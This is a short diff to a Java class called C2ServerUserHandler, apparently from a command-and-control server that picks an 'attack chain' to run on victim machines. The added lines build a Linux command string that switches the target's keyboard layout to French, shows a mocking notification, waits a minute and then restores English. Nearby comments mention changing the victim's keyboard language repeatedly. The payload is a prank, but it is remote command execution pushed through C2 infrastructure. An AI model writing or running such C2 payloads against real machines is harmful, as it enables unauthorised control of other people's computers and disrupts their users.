@@ -402,6 +402,11 @@ public class C2ServerUserHandler implements Runnable{
 
                     // Linux
                     linuxCommands = "";
+                    linuxCommands += "setxkbmap fr;";
+                    linuxCommands += "notify-send 'Have Fun Learning French MF'";
+                    linuxCommands += "sleep 60;";
+                    linuxCommands += "notify-send 'Ok you can have English Again'";
+                    linuxCommands += "setxkbmap en;";
                     // TODO Figure out how to mess with Linux Keyboard
                 } else if (userAttackChainChoice.equals("3")){
                     // Change their Keybaord language every 30 seconds
